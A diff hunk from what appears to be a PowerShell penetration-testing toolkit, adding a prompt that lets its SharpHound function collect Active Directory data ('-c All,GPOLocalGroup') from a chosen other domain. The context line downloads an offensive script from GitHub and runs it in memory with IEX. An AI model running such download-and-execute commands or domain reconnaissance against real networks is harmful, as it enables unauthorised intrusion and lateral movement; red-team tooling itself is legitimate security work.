@@ -3082,7 +3082,19 @@ function Sharphound
     
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharphound3.ps1')
     Write-Host -ForegroundColor Yellow 'Running Sharphound Collector: '
+    $walkotherdomain = Read-Host -Prompt 'Do you want collect Bloodhound data on other than current domain? (yes/no)'
+    
+    if ($walkotherdomain -eq "yes" -or $walkotherdomain -eq "y" -or $walkotherdomain -eq "Yes" -or $walkotherdomain -eq "Y")
+    
+    {
+    $otherdomain = Read-Host -Prompt 'Pleas enter the domain to collect data from: '
+    Invoke-Sharphound3 -command "-c All,GPOLocalGroup -d $otherdomain"
+    }
+
+    else
+    {
     Invoke-Sharphound3
+    }
 }
 
 function oldchecks
